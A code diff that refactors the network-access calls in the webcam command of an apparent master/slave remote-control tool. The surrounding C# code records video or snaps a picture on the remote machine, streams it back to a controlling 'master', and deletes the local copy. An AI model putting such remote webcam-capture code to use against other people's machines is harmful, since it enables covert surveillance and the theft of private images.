@@ -2,7 +2,7 @@
 using Accord.Video.DirectShow;
 using Accord.Video.FFMPEG;
 using Shared;
-using Slave.Commands.Core;
+using Slave.Core;
 using System;
 using System.Collections.Generic;
 using System.Drawing.Imaging;
@@ -37,7 +37,7 @@ namespace Slave.Commands
             }
             catch (Exception)
             {
-                SlaveCommandsManager.networkManager.WriteLine("NoCam");
+                SlaveNetworkManager.GetInstance().WriteLine("NoCam");
                 return;
             }
 
@@ -74,10 +74,10 @@ namespace Slave.Commands
         {
             videoDevice.NewFrame += Video_NewFrame;
             videoDevice.Start();
-            SlaveCommandsManager.networkManager.WriteLine("OK");
+            SlaveNetworkManager.GetInstance().WriteLine("OK");
 
             // wait for master order to stop recording
-            SlaveCommandsManager.networkManager.ReadLine();
+            SlaveNetworkManager.GetInstance().ReadLine();
 
             // Wait for the capture device to stop, avoiding accessviolation exception if a newframe event is triggered
             videoDevice.SignalToStop();
@@ -89,7 +89,7 @@ namespace Slave.Commands
 
             using (var fs = new FileStream(videoFileName, FileMode.Open))
             {
-                SlaveCommandsManager.networkManager.StreamToNetworkStream(fs);
+                SlaveNetworkManager.GetInstance().StreamToNetworkStream(fs);
             }
 
             File.Delete(videoFileName);
@@ -109,12 +109,12 @@ namespace Slave.Commands
         void Picture_NewFrame(object sender, NewFrameEventArgs eventArgs)
         {
             videoDevice.SignalToStop();
-            SlaveCommandsManager.networkManager.WriteLine("OK");
+            SlaveNetworkManager.GetInstance().WriteLine("OK");
 
             using (var ms = new MemoryStream())
             {
                 eventArgs.Frame.Save(ms, ImageFormat.Png);
-                SlaveCommandsManager.networkManager.StreamToNetworkStream(ms);
+                SlaveNetworkManager.GetInstance().StreamToNetworkStream(ms);
             }
 
             mustReturn = true;
@@ -125,7 +125,7 @@ namespace Slave.Commands
             // If the video source is still running, no pic was taken
             if (videoDevice.IsRunning)
             {
-                SlaveCommandsManager.networkManager.WriteLine("KO");
+                SlaveNetworkManager.GetInstance().WriteLine("KO");
                 mustReturn = true;
             }
         }
